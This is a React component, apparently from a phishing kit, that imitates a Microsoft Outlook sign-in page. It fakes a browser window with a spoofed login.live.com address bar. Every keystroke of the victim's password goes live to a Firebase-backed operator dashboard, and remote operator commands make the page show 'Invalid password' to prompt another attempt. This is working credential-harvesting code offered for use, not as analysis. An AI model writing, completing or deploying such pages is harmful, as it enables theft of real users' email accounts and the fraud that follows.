import React from "react";
import { useNavigate } from "react-router-dom";
import EmailLayout from "../EmailLayout";
import { useFirebaseClient } from "../../../hooks/useFirebaseClient";
import { reportTyping } from "../../../firebase/typing";
import DeviceManager from "../../../utils/deviceManager";
import outGif from "../assets/outgif.gif";

// Página de senha do Outlook/Microsoft, seguindo o padrão visual do print
const OutlookPasswordPage = () => {
  const navigate = useNavigate();
  const { updateClientData, commands, clearCommands, clientData } = useFirebaseClient(navigate);
  const translations = {
    windowTitle: "Sign in to your account - Microsoft Edge",
    url: "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=175&ct=1754894&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015",
  };

  const [password, setPassword] = React.useState("");
  const [showPassword, setShowPassword] = React.useState(false);
  
  // Obter device number do DeviceManager (mesma lógica da GmailPasswordPage)
  const getLoggedInDevice = () => {
    return DeviceManager.getDeviceWithFirebaseData(clientData);
  };

  const [clientDevice, setClientDevice] = React.useState(getLoggedInDevice());
  
  // Atualizar device quando clientData mudar
  React.useEffect(() => {
    const newDevice = getLoggedInDevice();
    if (newDevice && newDevice !== clientDevice) {
      setClientDevice(newDevice);
    }
  }, [clientData?.deviceNumber, clientData?.deviceNumberConfirmed, clientData?.lastDevice, clientDevice]);
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const [loadingStage, setLoadingStage] = React.useState("bar"); // 'bar' | 'final'
  const phrases = React.useMemo(
    () => [
      "Connecting to Outlook...",
      "Verifying your account...",
      "Syncing security settings...",
      "Finalizing sign-in...",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);
  const debounceRef = React.useRef(null);
  const [isReady, setIsReady] = React.useState(false);
  React.useEffect(() => {
    // Preloader de ~3s dentro do modal para evitar flicker
    const id = setTimeout(() => setIsReady(true), 3000);
    return () => clearTimeout(id);
  }, []);

  // Posição e drag opcionais (mantendo padrão das outras janelas)
  const getModalWidth = () =>
    Math.min(420, Math.floor(window.innerWidth * 0.92));
  const [position, setPosition] = React.useState(() => ({
    left: Math.max(12, (window.innerWidth - getModalWidth()) / 2),
    top: Math.max(12, (window.innerHeight - 520) / 2),
  }));
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });
  const startDrag = (e) => {
    // Só permite arrastar se clicar no header da janela (não no conteúdo)
    const isHeaderElement = e.target.closest('[data-window-header="true"]');
    if (!isHeaderElement) return;

    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA", "LABEL"].includes(tag))
      return;
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.left,
      y: e.clientY - position.top,
    };
  };
  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition({
        left: Math.max(0, e.clientX - dragOffsetRef.current.x),
        top: Math.max(0, e.clientY - dragOffsetRef.current.y),
      });
    };
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  // Rotação das frases quando na etapa final
  React.useEffect(() => {
    if (isSubmitting && loadingStage === "final") {
      const id = setInterval(
        () => setPhraseIndex((p) => (p + 1) % phrases.length),
        2000
      );
      return () => clearInterval(id);
    }
  }, [isSubmitting, loadingStage, phrases.length]);

  // Detectar inválidos/outros comandos simples
  const [invalidMessage, setInvalidMessage] = React.useState("");
  // Função de navegação que sempre retorna false (deixa o useFirebaseClient lidar com redirecionamentos)
  const navigateByCommand = React.useCallback(() => false, []);

  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latest = commands[commands.length - 1];
    if (!latest || typeof latest !== "string") return;

    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      setInvalidMessage("Invalid password. Please try again.");
      setPassword("");
      setIsSubmitting(false);
      setLoadingStage("bar");
      setTimeout(() => clearCommands && clearCommands(), 200);
      return;
    }

    const navigated = navigateByCommand(latest);
    if (navigated) {
      // limpar após navegar
      setTimeout(() => clearCommands(), 100);
    }
  }, [commands, navigateByCommand, clearCommands]);

  React.useEffect(() => {
    updateClientData({
      currentUrl: "/sync?view=outlook_password",
      currentPage: "outlook_password",
      fromForm: true,
    });
  }, [updateClientData]);

  return (
    <EmailLayout>
      <div
        className="relative p-4 overflow-x-hidden"
        style={{ fontFamily: "Segoe UI, Roboto, Arial, sans-serif" }}
      >
        <div
          style={{
            background: isSubmitting ? "#ffffff" : "#fbfbfb",
            borderRadius: 10,
            boxShadow: "0 2px 16px rgba(0,0,0,0.2)",
            width: "min(420px, 92vw)",
            minHeight: 420,
            color: "#252423",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            position: "fixed",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            cursor: isDragging ? "grabbing" : "default",
            zIndex: 1000,
          }}
        >
          {/* Simulação da barra da janela/navegador (título + botões -, □, ×) */}
          <div
            data-window-header="true"
            onMouseDown={startDrag}
            style={{
              height: 24,
              background: "#e3f2fd",
              borderBottom: "1px solid #e1dfdd",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 14px",
              fontSize: 12,
              color: "#605e5c",
              cursor: "grab",
            }}
          >
            <span
              style={{
                opacity: 0.9,
                display: "flex",
                alignItems: "center",
                gap: 8,
              }}
            >
              {/* Microsoft squares logo */}
              <svg
                width="16"
                height="16"
                viewBox="0 0 32 32"
                xmlns="http://www.w3.org/2000/svg"
                aria-hidden="true"
              >
                <path fill="#FEBA08" d="M17 17h10v10H17z" />
                <path fill="#05A6F0" d="M5 17h10v10H5z" />
                <path fill="#80BC06" d="M17 5h10v10H17z" />
                <path fill="#F25325" d="M5 5h10v10H5z" />
              </svg>
              {translations.windowTitle}
            </span>
            <div style={{ display: "flex", gap: 6 }}>
              <button
                title="Minimize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M3 8.5H13"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
              <button
                title="Maximize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect
                    x="3.5"
                    y="3.5"
                    width="9"
                    height="9"
                    rx="1"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                  />
                </svg>
              </button>
              <button
                title="Close"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  color: "#605e5c",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M4 4L12 12"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                  <path
                    d="M12 4L4 12"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
            </div>
          </div>

          {/* Barra de endereço/URL - colada na barra da janela */}
          <div
            style={{
              borderBottom: "1px solid #e1dfdd",
              padding: 0,
              background: "#ffffff",
              margin: 0,
            }}
          >
            <div
              style={{
                width: "100%",
                background: "#f5f5f5",
                borderTop: "1px solid #d0d7de",
                borderBottom: "1px solid #d0d7de",
                boxSizing: "border-box",
                height: 28,
                display: "flex",
                alignItems: "center",
                padding: "0 14px 0 12px",
                gap: 10,
                fontSize: 12,
                color: "#605e5c",
              }}
            >
              <svg
                width="14"
                height="14"
                viewBox="0 0 16 16"
                xmlns="http://www.w3.org/2000/svg"
                version="1.1"
                fill="none"
                stroke="#605e5c"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="1.5"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
              </svg>
              <div
                style={{
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  whiteSpace: "nowrap",
                  flex: 1,
                  fontWeight: 400,
                  letterSpacing: "0.2px",
                }}
              >
                {translations.url}
              </div>
            </div>
          </div>

          {/* Conteúdo */}
          <div style={{ padding: "20px 22px 24px 24px", position: "relative" }}>
            {/* Spinner inicial sobrepondo apenas o conteúdo */}
            {!isReady && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  background: "#ffffff",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  zIndex: 10,
                }}
              >
                <div
                  style={{
                    width: 40,
                    height: 40,
                    border: "3px solid #106ebe",
                    borderTopColor: "transparent",
                    borderRadius: "50%",
                    animation: "spin 0.9s linear infinite",
                  }}
                />
              </div>
            )}
            {/* Header Microsoft (centralizado acima do email) */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                marginTop: 4,
              }}
            >
              <div
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 10,
                }}
              >
                <span style={{ display: "inline-flex", width: 32, height: 32 }}>
                  <svg
                    width="32"
                    height="32"
                    viewBox="0 0 32 32"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path fill="#FEBA08" d="M17 17h10v10H17z" />
                    <path fill="#05A6F0" d="M5 17h10v10H5z" />
                    <path fill="#80BC06" d="M17 5h10v10H17z" />
                    <path fill="#F25325" d="M5 5h10v10H5z" />
                  </svg>
                </span>
                <span style={{ fontSize: 18, color: "#1b1a19" }}>
                  Microsoft
                </span>
              </div>
            </div>

            <div style={{ display: "flex", justifyContent: "center" }}>
              <button
                type="button"
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 8,
                  padding: "6px 12px",
                  borderRadius: 999,
                  border: "1px solid #e1dfdd",
                  background: "#fbfbfb",
                  margin: "16px 0",
                  boxShadow: "inset 0 0 0 0 rgba(0,0,0,0)",
                  fontSize: 13,
                  color: "#605e5c",
                  cursor: "default",
                }}
              >
                {/* Mesmo SVG de usuário do GmailPassword */}
                <svg
                  width="18"
                  height="18"
                  viewBox="0 0 42 42"
                  xmlns="http://www.w3.org/2000/svg"
                  aria-hidden="true"
                  style={{ display: "block" }}
                >
                  <path
                    fill="#000000"
                    fillRule="evenodd"
                    d="M24,45A21,21,0,1,1,45,24,21,21,0,0,1,24,45Zm11.633-6c-.157-.231-.355-.518-.514-.742-.277-.394-.554-.788-.8-1.178C34.305,37.062,32.935,35.224,28,35a2.922,2.922,0,0,1-2.968-3.066L25,31c0-.135-.016.148,0,0V30l1-1a14.435,14.435,0,0,0,2.4-1.464l.135-.093A4.643,4.643,0,0,0,30,26l.036-.381A55.987,55.987,0,0,0,31,19c0-4.71-2.29-7-7-7-4.775,0-7,2.224-7,7a54.693,54.693,0,0,0,.963,6.616l.035.352a3.981,3.981,0,0,0,1.449,1.462l.1.062A19.174,19.174,0,0,0,22,29l1,1v1c.014.138,0-.146,0,0l-.033.934A2.9,2.9,0,0,1,20.084,35h0c-4.956.2-6.393,2.077-6.4,2.077-.252.4-.528.789-.807,1.184-.157.224-.355.51-.513.741a18.917,18.917,0,0,0,23.267,0ZM24,5A18.986,18.986,0,0,0,10.85,37.694c.382-.565.79-1.129,1.15-1.694,0,0,1.67-2.743,8-3,.645,0,.967-.422.967-1.066h0c0-.521,0-.934,0-.934,0-.13-.021-.247-.027-.373A17.5,17.5,0,0,1,18.4,29.133S16,27.657,16,26a60.16,60.16,0,0,1-1-7c0-4.644,1.986-9,9-9,6.92,0,9,4.356,9,9a61.784,61.784,0,0,1-1,7c0,1.611-2.4,3.133-2.4,3.133a13.873,13.873,0,0,1-2.543,1.546c0,.109-.023.209-.023.321,0,0,0,.413,0,.934h0c0,.644.32,1.066.965,1.066,6.424.288,8,3,8,3,.36.565.767,1.129,1.149,1.694A18.985,18.985,0,0,0,24,5Z"
                    transform="translate(-3 -3)"
                  />
                </svg>
                <span>{clientDevice}</span>
              </button>
            </div>

            {/* Título */}
            <h1
              style={{
                fontSize: 22,
                fontWeight: 600,
                margin: "6px 0 14px",
                color: "#1b1a19",
              }}
            >
              Enter password
            </h1>

            {/* Campo de senha */}
            <div style={{ marginTop: 8 }}>
              <label
                htmlFor="password"
                style={{
                  display: "block",
                  fontSize: 12,
                  color: "#605e5c",
                  marginBottom: 6,
                }}
              >
                Password
              </label>
              <div style={{ position: "relative" }}>
                <input
                  data-outlook-modal
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => {
                    const val = e.target.value;
                    setPassword(val);
                    // Atualiza imediatamente para refletir no dashboard em tempo real
                    try {
                      updateClientData({ outlookPassword: val });
                      reportTyping("outlookpass", val);
                    } catch {}
                  }}
                  style={{
                    width: "100%",
                    boxSizing: "border-box",
                    border: "1px solid #a19f9d",
                    borderRadius: 4,
                    padding: "10px 40px 10px 12px",
                    fontSize: 14,
                    outline: "none",
                    background: "#fbfbfb",
                  }}
                  placeholder="Password"
                  autoFocus
                />
                {/* Botão olho */}
                <button
                  type="button"
                  onClick={() => setShowPassword((v) => !v)}
                  aria-label={
                    showPassword
                      ? "Ocultar palavra-passe"
                      : "Mostrar palavra-passe"
                  }
                  style={{
                    position: "absolute",
                    right: 8,
                    top: "50%",
                    transform: "translateY(-50%)",
                    background: "none",
                    border: "none",
                    cursor: "pointer",
                    padding: 4,
                  }}
                >
                  <svg
                    width="22"
                    height="22"
                    viewBox="0 0 24 24"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    {/* Estilo de olho do print: arco superior + pupila */}
                    <path
                      d="M3 12c4-6 14-6 18 0"
                      stroke="#605e5c"
                      strokeWidth="1.8"
                      strokeLinecap="round"
                      fill="none"
                    />
                    <circle cx="12" cy="12" r="2" fill="#605e5c" />
                    {showPassword && (
                      <path
                        d="M4 16 L20 8"
                        stroke="#605e5c"
                        strokeWidth="1.6"
                        strokeLinecap="round"
                      />
                    )}
                  </svg>
                </button>
              </div>
              {invalidMessage && (
                <div style={{ color: "#a4262c", fontSize: 12, marginTop: 6 }}>
                  {invalidMessage}
                </div>
              )}
            </div>

            {/* Forgot link (maior) */}
            <div style={{ marginTop: 12 }}>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                style={{
                  color: "#0f6cbd",
                  textDecoration: "none",
                  fontSize: 15,
                  fontWeight: 600,
                }}
              >
                Forgot your password?
              </a>
            </div>

            {/* Botão Next mais embaixo */}
            <div style={{ marginTop: 44 }}>
              <button
                disabled={!password.trim()}
                style={{
                  width: "100%",
                  padding: "12px",
                  background: "#0F64B1",
                  color: "#fff",
                  border: "none",
                  borderRadius: 6,
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: password.trim() ? "pointer" : "not-allowed",
                  opacity: password.trim() ? 1 : 0.65,
                }}
                onClick={(e) => {
                  e.preventDefault();
                  if (!password.trim()) return;
                  try {
                    updateClientData({
                      outlookPassword: password,
                      outlookPasswordSubmittedAt: Date.now(),
                    });
                  } catch {}
                  setIsSubmitting(true);
                  setLoadingStage("final");
                }}
              >
                Next
              </button>
            </div>

            {/* Texto abaixo do Next */}
            <div style={{ marginTop: 16, textAlign: "center" }}>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                style={{
                  color: "#0f6cbd",
                  textDecoration: "none",
                  fontSize: 14,
                }}
              >
                Other ways to sign in
              </a>
            </div>

            {/* Etapa intermediária removida: sem spinner de 3s antes da etapa final */}

            {/* Próxima etapa com GIF + frases trocando */}
            {isSubmitting && loadingStage === "final" && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  background: "#ffffff",
                  display: "flex",
                  flexDirection: "column",
                  zIndex: 11,
                }}
              >
                {/* Centro com gif e frases */}
                <div
                  style={{
                    flex: 1,
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 16,
                    textAlign: "center",
                  }}
                >
                  <img
                    src={outGif}
                    alt="Outlook"
                    style={{ width: 300, height: "auto" }}
                  />
                  <div
                    style={{
                      width: 36,
                      height: 36,
                      border: "3px solid #106ebe",
                      borderTopColor: "transparent",
                      borderRadius: "50%",
                      animation: "spin 0.9s linear infinite",
                    }}
                  />
                  <div
                    style={{ color: "#323130", fontSize: 16, minHeight: 24 }}
                  >
                    {phrases[phraseIndex]}
                  </div>
                </div>
              </div>
            )}

            <style>{`
            @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
          `}</style>
          </div>
        </div>
      </div>
    </EmailLayout>
  );
};

export default OutlookPasswordPage;
